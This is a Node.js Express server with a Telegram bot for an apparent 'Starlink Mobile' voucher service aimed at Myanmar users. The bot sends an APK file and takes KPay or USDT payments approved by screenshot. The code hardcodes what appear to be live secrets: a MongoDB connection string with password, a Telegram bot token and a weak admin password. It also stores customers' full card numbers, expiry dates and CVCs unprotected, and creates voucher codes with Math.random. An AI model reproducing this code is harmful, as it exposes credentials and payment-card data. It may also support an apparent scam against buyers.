const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const jwt = require('jsonwebtoken');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://mongo:UTeVLbRgfLqdsrCzCzFUcitqLqPbLuzn@switchyard.proxy.rlwy.net:32968';
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'starlink123';
const JWT_SECRET = process.env.JWT_SECRET || 'starlink-secret-key';
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8356328415:AAHgDeYLhTDnkKmJxik2YxIHUEwWXeUThDg';
const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || '7590111505';
const APK_FILE_PATH = path.join(__dirname, 'public', 'Star Link Mobile 2026.001.14.apk');

// --- MIDDLEWARE & DB SETUP ---
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));
mongoose.connect(MONGODB_URI).then(() => console.log('Connected to MongoDB')).catch(err => { console.error('DB connection error:', err); process.exit(1); });

// --- SCHEMAS ---
const voucherSchema = new mongoose.Schema({ code: { type: String, required: true, unique: true, uppercase: true }, is_used: { type: Boolean, default: false }, used_at: Date, created_at: { type: Date, default: Date.now }, plan: String });
const userSchema = new mongoose.Schema({ name: String, email: String, amount: Number, planDuration: String, cardNumber: String, cardExpiry: String, cardCvc: String, country: String, countryName: String, postalCode: String, created_at: { type: Date, default: Date.now } });
const paymentSettingsSchema = new mongoose.Schema({ kpay_name: String, kpay_phone: String, kpay_note: String, kpay_extra_note: String, usdt_bep20_address: String, usdt_trc20_address: String, usdt_amount: Number, usdt_extra_note: String });

const Voucher = mongoose.model('Voucher', voucherSchema);
const User = mongoose.model('User', userSchema);
const PaymentSettings = mongoose.model('PaymentSettings', paymentSettingsSchema);

// --- TELEGRAM BOT LOGIC ---
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const plans = {
    '1_month': { name: '1 Month', price: 45000, usdt: 15 },
    '3_months': { name: '3 Months', price: 125000, usdt: 40 },
    '6_months': { name: '6 Months', price: 240000, usdt: 75 },
    '12_months': { name: '12 Months', price: 450000, usdt: 140 },
};

bot.onText(/\/start/, (msg) => {
    const welcomeText = "🇲🇲 Starlink Mobile မှကြိုဆိုပါတယ်။\n\nအောက်ပါ Menu မှတဆင့် ဝန်ဆောင်မှုများကို ရွေးချယ်နိုင်ပါပြီ။";
    bot.sendMessage(msg.chat.id, welcomeText, { reply_markup: { inline_keyboard: [[{ text: "App ဒေါင်းလုဒ်ရယူရန်", callback_data: 'download_app' }], [{ text: "အသုံးပြုပုံလမ်းညွှန်", callback_data: 'guide' }], [{ text: "Voucher ဝယ်ရန်", callback_data: 'buy_voucher' }]] } });
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = msg.chat.id;
    const [action, ...params] = data.split('_');

    try {
        switch (action) {
            case 'download':
                bot.sendMessage(chatId, "Starlink Mobile App ကို ပို့ပေးနေပါသည်၊ ခေတ္တစောင့်ဆိုင်းပေးပါ။");
                bot.sendDocument(chatId, APK_FILE_PATH).catch(e => console.error('APK Send Error:', e));
                break;
            case 'guide':
                bot.sendMessage(chatId, "Starlink Mobile အသုံးပြုပုံအဆင့်ဆင့်မှာ အောက်ပါအတိုင်းဖြစ်ပါသည်:\n\n1. App ကို Install လုပ်ပါ။\n2. Voucher ဝယ်ယူပြီး ရရှိလာသော Code ကို App တွင်ထည့်သွင်းပါ။\n3. Activate လုပ်ပြီး Starlink WiFi ကိုအသုံးပြုနိုင်ပါပြီ။");
                break;
            case 'buy':
                const planOptions = Object.keys(plans).map(key => ([{ text: `${plans[key].name} - ${plans[key].price.toLocaleString()} MMK`, callback_data: `plan_${key}` }]));
                bot.sendMessage(chatId, "အောက်ပါ Plan များမှ နှစ်သက်ရာတစ်ခုကို ရွေးချယ်ပါ။", { reply_markup: { inline_keyboard: planOptions } });
                break;
            case 'plan':
                const planKey = params.join('_');
                if (!plans[planKey]) return;
                bot.sendMessage(chatId, `သင် ${plans[planKey].name} ကို ရွေးချယ်ထားပါတယ်။ \n\nကျေးဇူးပြု၍ ငွေပေးချေမှုနည်းလမ်းတစ်ခုကို ရွေးချယ်ပါ။`, { reply_markup: { inline_keyboard: [[{ text: "KPay", callback_data: `payment_kpay_${planKey}` }], [{ text: "USDT (BEP20)", callback_data: `payment_usdt-bep20_${planKey}` }], [{ text: "USDT (TRC20)", callback_data: `payment_usdt-trc20_${planKey}` }]] } });
                break;
            case 'payment':
                const [paymentMethod, ...pKeyParts] = params;
                const paymentPlanKey = pKeyParts.join('_');
                const settings = await PaymentSettings.findOne();
                if (!settings) throw new Error('Payment settings not configured.');

                if (paymentMethod === 'kpay') {
                    await bot.sendMessage(chatId, `ကျေးဇူးပြု၍ အောက်ပါ KPay အကောင့်သို့ ${plans[paymentPlanKey].price.toLocaleString()} MMK လွှဲပေးပါ။\n\nName: ${settings.kpay_name}\nNote: ${settings.kpay_note}`);
                    await bot.sendMessage(chatId, `\`${settings.kpay_phone}\``, { parse_mode: 'Markdown' });
                } else {
                    const address = paymentMethod === 'usdt-bep20' ? settings.usdt_bep20_address : settings.usdt_trc20_address;
                    await bot.sendMessage(chatId, `ကျေးဇူးပြု၍ အောက်ပါ USDT (${paymentMethod.split('-')[1].toUpperCase()}) လိပ်စာသို့ ${plans[paymentPlanKey].usdt} USDT လွှဲပေးပါ။`);
                    await bot.sendMessage(chatId, `\`${address}\``, { parse_mode: 'Markdown' });
                }
                await bot.sendMessage(chatId, "ငွေလွှဲပြီးပါက Screenshot ပို့ပေးပါ။\nငွေလွှဲ Screenshot ကိုစောင့်နေပါတယ်...");
                bot.once('photo', (photoMsg) => handleScreenshot(photoMsg, paymentPlanKey));
                break;
            case 'approve':
                const [userId, userChatId, ...approvedPlanParams] = params;
                const approvedPlanKey = approvedPlanParams.join('_');
                const code = await generateVoucherCode(approvedPlanKey);
                bot.sendMessage(userChatId, `✅ သင်၏ ${plans[approvedPlanKey].name} အတွက် Voucher Code ရပါပြီ။\n\n\`\`\`${code}\`\`\``, { parse_mode: 'Markdown' });
                bot.editMessageText(`✅ Approved for ${userId}.`, { chat_id: msg.chat.id, message_id: msg.message_id });
                break;
            case 'reject':
                const [rejectedUserId, rejectedUserChatId] = params;
                bot.sendMessage(rejectedUserChatId, "❌ သင်၏ ငွေပေးချေမှုကို ငြင်းပယ်လိုက်ပါသည်။");
                bot.editMessageText(`❌ Rejected for ${rejectedUserId}.`, { chat_id: msg.chat.id, message_id: msg.message_id });
                break;
        }
    } catch (error) { console.error('Callback Query Error:', error); }
});

async function handleScreenshot(msg, planKey) {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userFullName = `${msg.from.first_name} ${msg.from.last_name || ''}`.trim();
    const caption = `New Payment Screenshot for ${plans[planKey].name} from user ${userFullName} (ID: ${userId}).`;
    
    await bot.forwardMessage(ADMIN_TELEGRAM_ID, chatId, msg.message_id);
    await bot.sendMessage(ADMIN_TELEGRAM_ID, caption, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Approve", callback_data: `approve_${userId}_${chatId}_${planKey}` },
                    { text: "Reject", callback_data: `reject_${userId}_${chatId}` }
                ]
            ]
        }
    });
    bot.sendMessage(chatId, "သင်၏ ငွေပေးချေမှုကို လက်ခံရရှိပါသည်။ Admin မှစစ်ဆေးပြီး အတည်ပြုပေးပါမည်။ ခေတ္တခဏစောင့်ဆိုင်းပေးပါ။");
}

async function generateVoucherCode(plan) {
    const code = 'STAR-' + Math.random().toString(36).substring(2, 10).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();
    try {
        const voucher = new Voucher({ code, plan });
        await voucher.save();
        return code;
    } catch (err) {
        if (err.code === 11000) return generateVoucherCode(plan);
        throw err;
    }
}

function authMiddleware(req, res, next) {
    const token = (req.headers.authorization || '').slice(7);
    if (!token) return res.status(401).json({ success: false, message: 'Unauthorized' });
    try { jwt.verify(token, JWT_SECRET); next(); } catch (err) { return res.status(401).json({ success: false, message: 'Invalid token' }); }
}

// --- API ROUTES ---
app.post('/api/auth/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USER && password === ADMIN_PASS) {
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '12h' });
        return res.json({ success: true, token });
    }
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
});

app.get('/api/payment-settings', authMiddleware, async (req, res) => {
    try {
        let settings = await PaymentSettings.findOne();
        if (!settings) {
            settings = await new PaymentSettings({ kpay_name: 'Testing', kpay_phone: '09123456789', kpay_note: 'Payment', usdt_amount: 12, usdt_bep20_address: 'demo-bep20-address', usdt_trc20_address: 'demo-trc20-address' }).save();
        }
        res.json({ success: true, settings });
    } catch (e) { res.status(500).json({ success: false }); }
});

app.post('/api/payment-settings', authMiddleware, async (req, res) => {
    try {
        const settings = await PaymentSettings.findOneAndUpdate({}, req.body, { new: true, upsert: true });
        res.json({ success: true, settings });
    } catch (e) { res.status(500).json({ success: false }); }
});

app.get('/api/vouchers', authMiddleware, async (req, res) => {
    try { res.json({ success: true, vouchers: await Voucher.find().sort({ created_at: -1 }) }); } catch (e) { res.status(500).json({ success: false }); }
});

app.delete('/api/vouchers/:id', authMiddleware, async (req, res) => {
    try { await Voucher.findByIdAndDelete(req.params.id); res.json({ success: true }); } catch(e) { res.status(500).json({ success: false }); }
});

app.delete('/api/vouchers/clear', authMiddleware, async (req, res) => {
    try { await Voucher.deleteMany({}); res.json({ success: true }); } catch(e) { res.status(500).json({ success: false }); }
});

app.get('/api/users', authMiddleware, async (req, res) => {
    try { res.json({ success: true, users: await User.find().sort({ created_at: -1 }) }); } catch (e) { res.status(500).json({ success: false }); }
});

app.delete('/api/users/:id', authMiddleware, async (req, res) => {
    try { await User.findByIdAndDelete(req.params.id); res.json({ success: true }); } catch(e) { res.status(500).json({ success: false }); }
});

app.delete('/api/users/clear', authMiddleware, async (req, res) => {
    try { await User.deleteMany({}); res.json({ success: true }); } catch(e) { res.status(500).json({ success: false }); }
});

app.get('/api/vouchers/stats', authMiddleware, async (req, res) => {
    try { const total = await Voucher.countDocuments(); const used = await Voucher.countDocuments({ is_used: true }); res.json({ success: true, total, used, available: total - used }); } catch (e) { res.status(500).json({ success: false }); }
});

// --- SERVER START ---
app.get('/*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));